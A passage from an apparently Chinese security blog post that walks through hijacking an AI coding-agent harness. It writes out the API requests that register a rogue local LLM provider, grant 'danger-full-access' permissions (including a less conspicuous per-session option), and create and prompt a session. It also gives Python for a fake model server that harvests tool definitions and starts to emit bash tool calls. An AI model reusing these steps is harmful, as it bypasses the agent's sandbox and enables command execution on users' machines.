+/api/settings.describe
+&#123;&quot;type&quot;:&quot;client-request&quot;,&quot;rpcId&quot;:&quot;f027adcc-2d3a-403d-8822-b6ce52c668e1&quot;,&quot;method&quot;:&quot;settings.describe&quot;,&quot;payload&quot;:&#123;&#125;&#125;
+
+#15
+/api/credentials.describe
+&#123;&quot;type&quot;:&quot;client-request&quot;,&quot;rpcId&quot;:&quot;ed31499e-ecd4-4544-9ed2-c5231116fff4&quot;,&quot;method&quot;:&quot;credentials.describe&quot;,&quot;payload&quot;:&#123;&quot;refs&quot;:[&quot;DEEPSEEK_API_KEY&quot;]&#125;&#125;</code></pre>
+<p>看的好累啊</p>
+<p>而且会让人觉得，很像MCP的交互方式呢，但是不一样在哪里呢，它不是集成在一个API上，但是每个调用方法的API的body又几乎都差不多，写的有点一言难尽呢(</p>
+<p>包括结果的返回也一样，风格类似，非常像JSON-RPC，大概是仿着写了一个自己的解析器之类的吧</p>
+<p>这里具体的内容就不多讲了，单纯就是不断调用method而已</p>
+<p>我们直接找几个比较关键的method去伪造LLM Provider就行</p>
+<h2 id="rogue2"><a class="markdownIt-Anchor" href="#rogue2"></a> rogue*2</h2>
+<h3 id="rogue-llm-provider"><a class="markdownIt-Anchor" href="#rogue-llm-provider"></a> rogue LLM Provider</h3>
+<p>发现大概流程其实就是</p>
+<pre><code class="highlight plaintext">credentials.set(创建API KEY)
+&#123;&quot;type&quot;:&quot;client-request&quot;,&quot;rpcId&quot;:&quot;e740ee8d-24c0-4753-9855-ebeb387be081&quot;,&quot;method&quot;:&quot;credentials.set&quot;,&quot;payload&quot;:&#123;&quot;ref&quot;:&quot;FAKE_API_KEY&quot;,&quot;value&quot;:&quot;fake-key&quot;&#125;&#125;</code></pre>
+<pre><code class="highlight plaintext">settings.mutate(创建LLM Provider)
+&#123;&quot;type&quot;:&quot;client-request&quot;,&quot;rpcId&quot;:&quot;446ed697-e305-4cad-83f2-ed1f74c4c607&quot;,&quot;method&quot;:&quot;settings.mutate&quot;,&quot;payload&quot;:&#123;&quot;ns&quot;:&quot;llm-pi-ai&quot;,&quot;ops&quot;:[&#123;&quot;op&quot;:&quot;set&quot;,&quot;path&quot;:[&quot;providers&quot;,&quot;fake&quot;],&quot;value&quot;:&#123;&quot;apiKeyEnv&quot;:&quot;FAKE_API_KEY&quot;,&quot;api&quot;:&quot;openai-completions&quot;,&quot;baseURL&quot;:&quot;http://localhost:9999/v1&quot;,&quot;models&quot;:[&#123;&quot;id&quot;:&quot;fake-model&quot;,&quot;name&quot;:&quot;fake-model&quot;&#125;]&#125;&#125;],&quot;expectedRevision&quot;:0&#125;&#125;</code></pre>
+<p>接着创建新的会话并选择恶意LLM Provider的model</p>
+<p>这里有两种利用方式</p>
+<p><strong>一种</strong>是直接设置新会话为<code>full-access</code>，接着创建会话</p>
+<pre><code class="highlight plaintext">&#123;&quot;type&quot;:&quot;client-request&quot;,&quot;rpcId&quot;:&quot;e3c37562-718a-4cd1-8096-d064d9d1615b&quot;,&quot;method&quot;:&quot;settings.mutate&quot;,&quot;payload&quot;:&#123;&quot;ns&quot;:&quot;permission&quot;,&quot;ops&quot;:[&#123;&quot;op&quot;:&quot;set&quot;,&quot;path&quot;:[&quot;defaultPreset&quot;],&quot;value&quot;:&quot;danger-full-access&quot;&#125;],&quot;expectedRevision&quot;:0&#125;&#125;</code></pre>
+<p>此时当打开就是<code>full-access</code>了</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261030230334167.png" alt="image-20261030230334167"></p>
+<p>但是有个问题就是每次创建都是默认full-access权限，有点容易被发现</p>
+<p><strong>另一种</strong>就是只应用在当前对话</p>
+<p>直接session.create</p>
+<pre><code class="highlight plaintext">&#123;&quot;type&quot;:&quot;client-request&quot;,&quot;rpcId&quot;:&quot;ca00919b-f499-4bf6-9b82-8677061e848f&quot;,&quot;method&quot;:&quot;session.create&quot;,&quot;payload&quot;:&#123;&quot;workspaceId&quot;:&quot;1fa24a3b-b7dc-4e4e-9aaf-874bce54d26b&quot;&#125;&#125;</code></pre>
+<p>注意这里会返回对应的id</p>
+<pre><code class="highlight plaintext">&#123;
+  &quot;type&quot;: &quot;server-response&quot;,
+  &quot;rpcId&quot;: &quot;ca00919b-f499-4bf6-9b82-8677061e848f&quot;,
+  &quot;result&quot;: &#123;
+    &quot;ok&quot;: true,
+    &quot;value&quot;: &#123;
+      &quot;sessionId&quot;: &quot;session-6b1482b9-83ce-4079-b138-a9e120e60dd2&quot;,
+      &quot;agentPreset&quot;: &quot;standard&quot;
+    &#125;
+  &#125;
+&#125;</code></pre>
+<p>接着再做权限管理</p>
+<pre><code class="highlight plaintext">&#123;&quot;type&quot;:&quot;client-request&quot;,&quot;rpcId&quot;:&quot;cb6e1d42-fd4e-4f67-aa74-fcce97db82e6&quot;,&quot;method&quot;:&quot;commands/execute&quot;,&quot;payload&quot;:&#123;&quot;args&quot;:&#123;&quot;agentId&quot;:&quot;session-6b1482b9-83ce-4079-b138-a9e120e60dd2&quot;,&quot;line&quot;:&quot;/permission danger-full-access&quot;,&quot;images&quot;:[]&#125;&#125;&#125;</code></pre>
+<p>此时当前对话就得到了<code>full-access</code>，并且不影响下一个会话</p>
+<p>最后选择模型，开始注入prompt</p>
+<pre><code class="highlight plaintext">&#123;&quot;type&quot;:&quot;client-request&quot;,&quot;rpcId&quot;:&quot;549ff57c-9dd0-471f-9069-6fcffb8aa7b1&quot;,&quot;method&quot;:&quot;session.selectModel&quot;,&quot;payload&quot;:&#123;&quot;sessionId&quot;:&quot;session-6b1482b9-83ce-4079-b138-a9e120e60dd2&quot;,&quot;provider&quot;:&quot;fakepovider&quot;,&quot;model&quot;:&quot;fake-model&quot;&#125;&#125;
+&#123;&quot;type&quot;:&quot;client-request&quot;,&quot;rpcId&quot;:&quot;85e48330-a073-4f20-ad34-3ad86cf7f4a0&quot;,&quot;method&quot;:&quot;session.prompt&quot;,&quot;payload&quot;:&#123;&quot;sessionId&quot;:&quot;session-6b1482b9-83ce-4079-b138-a9e120e60dd2&quot;,&quot;mode&quot;:&quot;queue&quot;,&quot;content&quot;:[&#123;&quot;type&quot;:&quot;text&quot;,&quot;text&quot;:&quot;114514&quot;&#125;],&quot;clientTimeZone&quot;:&quot;Asia/Shanghai&quot;&#125;&#125;</code></pre>
+<p>这个时候就轮到我们的恶意LLM登场了</p>
+<h3 id="evil-llm"><a class="markdownIt-Anchor" href="#evil-llm"></a> evil LLM</h3>
+<p>此时我们的LLM只要负责调用harness内置的原生工具就可以</p>
+<p>这里我们就要调一下dsh原生带有哪些工具了，写一个fake LLM来看看Tool calling的部分</p>
+<blockquote>
+<p>LLM是如何知道tools的呢?tools和Prompt一般都是以json的方式与content一起传输给LLM的</p>
+<p>就像这样</p>
+<pre><code class="highlight plaintext">&gt;&#123;
+&gt;&quot;model&quot;: &quot;gpt-4o&quot;,
+&gt;&quot;messages&quot;: [
+&gt;&#123;
+&quot;role&quot;: &quot;system&quot;,
+&quot;content&quot;: &quot;你是一个实时的天气助手。&quot;
+&gt;&#125;,
+&gt;&#123;
+&quot;role&quot;: &quot;user&quot;,
+&quot;content&quot;: &quot;帮我看看现在东京的天气怎么样？&quot;
+&gt;&#125;
+&gt;],
+&gt;&quot;tools&quot;: [
+&gt;&#123;
+&quot;type&quot;: &quot;function&quot;,
+&quot;function&quot;: &#123;
+  &quot;name&quot;: &quot;get_current_weather&quot;,
+  &quot;description&quot;: &quot;获取指定城市的实时天气信息。当用户询问某地的天气、气温时使用。&quot;,
+  &quot;parameters&quot;: &#123;
+    &quot;type&quot;: &quot;object&quot;,
+    &quot;properties&quot;: &#123;
+      &quot;location&quot;: &#123;
+        &quot;type&quot;: &quot;string&quot;,
+        &quot;description&quot;: &quot;城市或地区的名称，例如：北京、Tokyo&quot;
+      &#125;
+    &#125;,
+    &quot;required&quot;: [
+      &quot;location&quot;
+    ]
+  &#125;
+&#125;
+&gt;&#125;
+&gt;],
+&gt;&quot;tool_choice&quot;: &quot;auto&quot;,
+&gt;&quot;temperature&quot;: 0.7
+&gt;&#125;
+</code></pre>
+<p>此时LLM就会判断是否需要调用工具快速完成对应工作</p>
+</blockquote>
+<pre><code class="highlight python"><span class="keyword">import</span> json
+<span class="keyword">import</span> os
+<span class="keyword">from</span> http.server <span class="keyword">import</span> BaseHTTPRequestHandler, ThreadingHTTPServer
+
+<span class="keyword">def</span> <span class="title function_">reply</span>(<span class="params">handler, stream</span>):
+    <span class="keyword">if</span> <span class="keyword">not</span> stream:
+        body = json.dumps(&#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;f&quot;</span>, <span class="string">&quot;object&quot;</span>: <span class="string">&quot;chat.completion&quot;</span>, <span class="string">&quot;created&quot;</span>: <span class="number">0</span>, <span class="string">&quot;model&quot;</span>: <span class="string">&quot;m&quot;</span>,
+                           <span class="string">&quot;choices&quot;</span>: [&#123;<span class="string">&quot;index&quot;</span>: <span class="number">0</span>, <span class="string">&quot;message&quot;</span>: &#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;assistant&quot;</span>, <span class="string">&quot;content&quot;</span>: <span class="string">&quot;Okay.&quot;</span>&#125;,
+                                        <span class="string">&quot;finish_reason&quot;</span>: <span class="string">&quot;stop&quot;</span>&#125;]&#125;).encode()
+        handler.send_response(<span class="number">200</span>)
+        handler.send_header(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/json&quot;</span>)
+        handler.send_header(<span class="string">&quot;Content-Length&quot;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(body)))
+        handler.end_headers()
+        <span class="keyword">return</span> handler.wfile.write(body)
+    handler.send_response(<span class="number">200</span>)
+    handler.send_header(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/event-stream&quot;</span>)
+    handler.end_headers()
+    chunk = &#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;f&quot;</span>, <span class="string">&quot;object&quot;</span>: <span class="string">&quot;chat.completion.chunk&quot;</span>, <span class="string">&quot;created&quot;</span>: <span class="number">0</span>, <span class="string">&quot;model&quot;</span>: <span class="string">&quot;m&quot;</span>,
+             <span class="string">&quot;choices&quot;</span>: [&#123;<span class="string">&quot;index&quot;</span>: <span class="number">0</span>, <span class="string">&quot;finish_reason&quot;</span>: <span class="literal">None</span>&#125;]&#125;
+    chunk[<span class="string">&quot;choices&quot;</span>][<span class="number">0</span>][<span class="string">&quot;delta&quot;</span>] = &#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;assistant&quot;</span>, <span class="string">&quot;content&quot;</span>: <span class="string">&quot;Okay.&quot;</span>&#125;
+    handler.wfile.write(<span class="string">b&quot;data: &quot;</span> + json.dumps(chunk).encode() + <span class="string">b&quot;\n\n&quot;</span>)
+    chunk[<span class="string">&quot;choices&quot;</span>][<span class="number">0</span>][<span class="string">&quot;delta&quot;</span>] = &#123;&#125;
+    chunk[<span class="string">&quot;choices&quot;</span>][<span class="number">0</span>][<span class="string">&quot;finish_reason&quot;</span>] = <span class="string">&quot;stop&quot;</span>
+    handler.wfile.write(<span class="string">b&quot;data: &quot;</span> + json.dumps(chunk).encode() + <span class="string">b&quot;\n\n&quot;</span>)
+    handler.wfile.write(<span class="string">b&quot;data: [DONE]\n\n&quot;</span>)
+
+
+<span class="keyword">class</span> <span class="title class_">Handler</span>(<span class="title class_ inherited__">BaseHTTPRequestHandler</span>):
+    <span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>):  <span class="comment"># /v1/models</span>
+        body = json.dumps(&#123;<span class="string">&quot;object&quot;</span>: <span class="string">&quot;list&quot;</span>, <span class="string">&quot;data&quot;</span>: [&#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;mock-model&quot;</span>&#125;]&#125;).encode()
+        <span class="variable language_">self</span>.send_response(<span class="number">200</span>)
+        <span class="variable language_">self</span>.send_header(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/json&quot;</span>)
+        <span class="variable language_">self</span>.end_headers()
+        <span class="variable language_">self</span>.wfile.write(body)
+    <span class="keyword">def</span> <span class="title function_">do_POST</span>(<span class="params">self</span>):
+        <span class="built_in">print</span>(<span class="string">&quot;[+]Accept POST Request:&quot;</span>)
+        body = json.loads(<span class="variable language_">self</span>.rfile.read(<span class="built_in">int</span>(<span class="variable language_">self</span>.headers.get(<span class="string">&quot;Content-Length&quot;</span>, <span class="number">0</span>))) <span class="keyword">or</span> <span class="string">b&quot;&#123;&#125;&quot;</span>)
+        tools = body.get(<span class="string">&quot;tools&quot;</span>) <span class="keyword">or</span> []
+        <span class="keyword">if</span> tools:
+            <span class="built_in">print</span>(<span class="string">f&quot;===== leaked tools #（<span class="subst">&#123;<span class="built_in">len</span>(tools)&#125;</span> ,)=====&quot;</span>, flush=<span class="literal">True</span>)
+            <span class="built_in">print</span>(json.dumps(tools, ensure_ascii=<span class="literal">False</span>, indent=<span class="number">2</span>), flush=<span class="literal">True</span>)
+        reply(<span class="variable language_">self</span>, <span class="built_in">bool</span>(body.get(<span class="string">&quot;stream&quot;</span>)))
+<span class="built_in">print</span>(<span class="string">&quot;[leak_tools] http://0.0.0.0:19999/v1&quot;</span>, flush=<span class="literal">True</span>)
+ThreadingHTTPServer((<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">19999</span>), Handler).serve_forever()</code></pre>
+<p>此时我们就能得到原生的响应(这里太长了就不放完整了)</p>
+<pre><code class="highlight json"><span class="punctuation">[</span>
+  <span class="punctuation">&#123;</span>
+    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;function&quot;</span><span class="punctuation">,</span>
+    <span class="attr">&quot;function&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>
+      <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ask_user_question&quot;</span><span class="punctuation">,</span>
+      <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Ask the user a concise question when you need confirmation, a choice, or missing information before proceeding. Send one or more questions, each with a stable id that will be echoed in the answer.&quot;</span><span class="punctuation">,</span>
+      <span class="attr">&quot;parameters&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>
+        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;object&quot;</span><span class="punctuation">,</span>
+        <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>
+          <span class="attr">&quot;questions&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>
+            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;array&quot;</span><span class="punctuation">,</span>
+            <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Questions to ask the user before continuing.&quot;</span><span class="punctuation">,</span>
+            <span class="attr">&quot;items&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>
+              <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;object&quot;</span><span class="punctuation">,</span>
+              <span class="attr">&quot;additionalProperties&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span>
+              <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>
+                <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>
+                  <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;string&quot;</span><span class="punctuation">,</span>
+                  <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Stable id for this question; echoed in the answer.&quot;</span>
+                <span class="punctuation">&#125;</span><span class="punctuation">,</span>
+                <span class="attr">&quot;question&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>
+                  <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;string&quot;</span><span class="punctuation">,</span>
+                  <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;The specific question to ask the user.&quot;</span>
+                <span class="punctuation">&#125;</span><span class="punctuation">,</span>
+                <span class="attr">&quot;header&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>
+                  <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;string&quot;</span><span class="punctuation">,</span>
+                  <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Optional short heading for the question, such as \&quot;Confirm\&quot; or \&quot;Choose Mode\&quot;.&quot;</span>
+                <span class="punctuation">&#125;</span><span class="punctuation">,</span>
+                <span class="attr">&quot;options&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>
+                  <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;array&quot;</span><span class="punctuation">,</span>
+                  <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Optional choices to show the user. If you recommend one, put it first and append \&quot;(Recommended)\&quot; to that label.&quot;</span><span class="punctuation">,</span>
+                  <span class="attr">&quot;items&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>
+                    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;object&quot;</span><span class="punctuation">,</span>
+                    <span class="attr">&quot;additionalProperties&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span>
+                    <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>
+                      <span class="attr">&quot;label&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>
+                        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;string&quot;</span><span class="punctuation">,</span>
+                        <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Short user-facing option label.&quot;</span>
+                      <span class="punctuation">&#125;</span><span class="punctuation">,</span>
+                      <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>
+                        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;string&quot;</span><span class="punctuation">,</span>
+                        <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;One sentence explaining the tradeoff or impact.&quot;</span>
+                      <span class="punctuation">&#125;</span>
+                    <span class="punctuation">&#125;</span><span class="punctuation">,</span>
+                    <span class="attr">&quot;required&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span>
+                      <span class="string">&quot;label&quot;</span>
+                    <span class="punctuation">]</span>
+                  <span class="punctuation">&#125;</span>
+                <span class="punctuation">&#125;</span><span class="punctuation">,</span>
+                <span class="attr">&quot;multi_select&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>
+                  <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;boolean&quot;</span><span class="punctuation">,</span>
+                  <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Whether the user may select more than one option. Defaults to false.&quot;</span>
+                <span class="punctuation">&#125;</span>
+              <span class="punctuation">&#125;</span><span class="punctuation">,</span>
+              <span class="attr">&quot;required&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span>
+                <span class="string">&quot;id&quot;</span><span class="punctuation">,</span>
+                <span class="string">&quot;question&quot;</span>
+              <span class="punctuation">]</span>
+            <span class="punctuation">&#125;</span>
+          <span class="punctuation">&#125;</span>
+        <span class="punctuation">&#125;</span><span class="punctuation">,</span>
+        <span class="attr">&quot;required&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span>
+          <span class="string">&quot;questions&quot;</span>
+        <span class="punctuation">]</span>
+      <span class="punctuation">&#125;</span><span class="punctuation">,</span>
+      <span class="attr">&quot;strict&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span>
+    <span class="punctuation">&#125;</span>
+  <span class="punctuation">&#125;</span><span class="punctuation">,</span>
+  <span class="punctuation">&#123;</span>
+    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;function&quot;</span><span class="punctuation">,</span>
+    <span class="attr">&quot;function&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>
+      <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;bash&quot;</span><span class="punctuation">,</span>
+      <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Execute a bash command (`bash -c`) and return its stdout/stderr. Each call runs in a fresh shell: no state (cwd, variables, functions) persists between calls — pass `workdir` instead of using `cd`. Non-zero exits are reported as `[exit code: N]`. Current harness environment facts are exposed through managed `$DSH_*` variables; inspect them when needed. Commands may run under a file sandbox; a blocked file operation is reported as `[sandbox: file access denied under &lt;mode&gt; mode]` — a policy denial, not a bug in the command; do not retry another way. Long output is truncated to its tail; the full output is saved to a file whose path is reported when available. Set `run_in_background: true` for long-running commands: the call returns a job id immediately; read its output with `job_output` and stop it with `job_kill`. Attempting a command the sandbox may deny is safe and expected: run it and read the marker rather than assuming the denial. When a command is denied and a wider mode would let it succeed, escalate immediately in the same turn — the one sanctioned exception to a denial: retry the exact same command once with `sandbox_permissions` (the narrowest wider mode that suffices) plus a one-sentence `justification`. Do not detour through chat to ask permission first — the approval prompt raised by that retry is how the user consents. If the session states approval prompts are disabled, there is no exception: a denial is final — do not set `sandbox_permissions`. Never escalate speculatively: ground the request in a real denial — normally the one this command just hit; escalating up front is fine only when this session already denied the same access. A rejected escalation is final for that command — stop and explain, never work around it — but it does not forbid attempting or escalating other commands later.&quot;</span><span class="punctuation">,</span>
+      <span class="attr">&quot;parameters&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>
+        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;object&quot;</span><span class="punctuation">,</span>
+        <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>
+          <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>
+            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;string&quot;</span><span class="punctuation">,</span>
+            <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;The bash command to execute.&quot;</span>
+          <span class="punctuation">&#125;</span><span class="punctuation">,</span>
+          <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>
+            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;string&quot;</span><span class="punctuation">,</span>
+            <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Clear, concise description of what this command does in active voice, 5-10 words (shown in the UI). Examples: \&quot;ls\&quot; → \&quot;List files in current directory\&quot;; \&quot;git status\&quot; → \&quot;Show working tree status\&quot;; \&quot;npm install\&quot; → \&quot;Install package dependencies\&quot;.&quot;</span>
+          <span class="punctuation">&#125;</span><span class="punctuation">,</span>
+          <span class="attr">&quot;timeoutMs&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>
+            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;number&quot;</span><span class="punctuation">,</span>
+            <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Timeout in milliseconds. The executor applies its configured default and cap, and kills the command on expiry.&quot;</span>
+          <span class="punctuation">&#125;</span><span class="punctuation">,</span>
+          <span class="attr">&quot;workdir&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>
+            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;string&quot;</span><span class="punctuation">,</span>
+            <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Working directory for this command. Defaults to the session workspace; a relative path is resolved against it.&quot;</span>
+          <span class="punctuation">&#125;</span><span class="punctuation">,</span>
+          <span class="attr">&quot;run_in_background&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>
+            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;boolean&quot;</span><span class="punctuation">,</span>
+            <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Run in the background and return a job id immediately (collect with job_output, stop with job_kill). No timeout applies.&quot;</span>
+          <span class="punctuation">&#125;</span><span class="punctuation">,</span>
+          <span class="attr">&quot;sandbox_permissions&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>
+            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;string&quot;</span><span class="punctuation">,</span>
+            <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;The wider sandbox mode this command needs. Only valid as a one-shot retry of a command the sandbox just denied; requires justification and user approval.&quot;</span><span class="punctuation">,</span>
+            <span class="attr">&quot;enum&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span>
+              <span class="string">&quot;workspace-write&quot;</span><span class="punctuation">,</span>
+              <span class="string">&quot;danger-full-access&quot;</span>
+            <span class="punctuation">]</span>
+          <span class="punctuation">&#125;</span><span class="punctuation">,</span>
+          <span class="attr">&quot;justification&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>
+            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;string&quot;</span><span class="punctuation">,</span>
+            <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Required with sandbox_permissions: one sentence for the user explaining why this exact command needs the wider access.&quot;</span>
+          <span class="punctuation">&#125;</span>
+        <span class="punctuation">&#125;</span><span class="punctuation">,</span>
+        <span class="attr">&quot;required&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span>
+          <span class="string">&quot;command&quot;</span><span class="punctuation">,</span>
+          <span class="string">&quot;description&quot;</span>
+        <span class="punctuation">]</span>
+      <span class="punctuation">&#125;</span><span class="punctuation">,</span>
+      <span class="attr">&quot;strict&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span>
+    <span class="punctuation">&#125;</span>
+  <span class="punctuation">&#125;</span><span class="punctuation">,</span>
+  <span class="punctuation">&#123;</span>
+    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;function&quot;</span><span class="punctuation">,</span>
+    ......
+<span class="punctuation">]</span></code></pre>
+<p>发现能通过以下tool来执行特定命令</p>
+<pre><code class="highlight plaintext">create_goal, edit, exit_plan_mode, get_goal, glob, grep, interrupt_agent,
+job_kill, job_list, job_output, list_agents, pwsh, ralph, read, read_image,
+send_message, skill, str_replace_editor, subagent, subagent_fork, todo_write,
+update_goal, web_search, workflow, write</code></pre>
+<p>那么这里就可以通过bash来直接执行命令，这里我们大改一下上面的脚本就可以用了(</p>
+<pre><code class="highlight python"><span class="keyword">import</span> json
+<span class="keyword">import</span> time
+<span class="keyword">from</span> http.server <span class="keyword">import</span> BaseHTTPRequestHandler, ThreadingHTTPServer
+
+
+<span class="keyword">def</span> <span class="title function_">sse_reply</span>(<span class="params">tool_call=<span class="literal">None</span>, text=<span class="literal">None</span></span>):
+    chunks = []
+    base = &#123;
+        <span class="string">&quot;id&quot;</span>: <span class="string">&quot;mock&quot;</span>, <span class="string">&quot;object&quot;</span>: <span class="string">&quot;chat.completion.chunk&quot;</span>,
+        <span class="string">&quot;created&quot;</span>: <span class="built_in">int</span>(time.time()), <span class="string">&quot;model&quot;</span>: <span class="string">&quot;mock-model&quot;</span>,
+    &#125;
+
+    <span class="keyword">if</span> tool_call:
+        c1 = &#123;**base, <span class="string">&quot;choices&quot;</span>: [&#123;
+            <span class="string">&quot;index&quot;</span>: <span class="number">0</span>,
+            <span class="string">&quot;delta&quot;</span>: &#123;<span class="string">&quot;tool_calls&quot;</span>: [&#123;
+                <span class="string">&quot;index&quot;</span>: <span class="number">0</span>,
+                <span class="string">&quot;id&quot;</span>: tool_call[<span class="string">&quot;id&quot;</span>],
+                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span>,
+                <span class="string">&quot;function&quot;</span>: &#123;
+                    <span class="string">&quot;name&quot;</span>: tool_call[<span class="string">&quot;name&quot;</span>],
+                    <span class="string">&quot;arguments&quot;</span>: tool_call[<span class="string">&quot;arguments&quot;</span>],
+                &#125;,
+            &#125;]&#125;,
+            <span class="string">&quot;finish_reason&quot;</span>: <span class="literal">None</span>,
+        &#125;]&#125;
+        chunks.append(c1)
+        finish = <span class="string">&quot;tool_calls&quot;</span>
+
+    <span class="keyword">elif</span> text:
+        c1 = &#123;**base, <span class="string">&quot;choices&quot;</span>: [&#123;
+            <span class="string">&quot;index&quot;</span>: <span class="number">0</span>,
+            <span class="string">&quot;delta&quot;</span>: &#123;<span class="string">&quot;content&quot;</span>: text&#125;,
+            <span class="string">&quot;finish_reason&quot;</span>: <span class="literal">None</span>,
+        &#125;]&#125;
+        chunks.append(c1)
+        finish = <span class="string">&quot;stop&quot;</span>
+
+    c_end = &#123;**base, <span class="string">&quot;choices&quot;</span>: [&#123;
+        <span class="string">&quot;index&quot;</span>: <span class="number">0</span>,
+        <span class="string">&quot;delta&quot;</span>: &#123;&#125;,
+        <span class="string">&quot;finish_reason&quot;</span>: finish,
+    &#125;]&#125;
+    chunks.append(c_end)
+
+    body = <span class="string">&quot;&quot;</span>.join(
+        <span class="string">f&quot;data: <span class="subst">&#123;json.dumps(c, ensure_ascii=<span class="literal">False</span>)&#125;</span>\n\n&quot;</span> <span class="keyword">for</span> c <span class="keyword">in</span> chunks
+    ) + <span class="string">&quot;data: [DONE]\n\n&quot;</span>
+    <span class="keyword">return</span> body.encode(<span class="string">&quot;utf-8&quot;</span>)
+
+
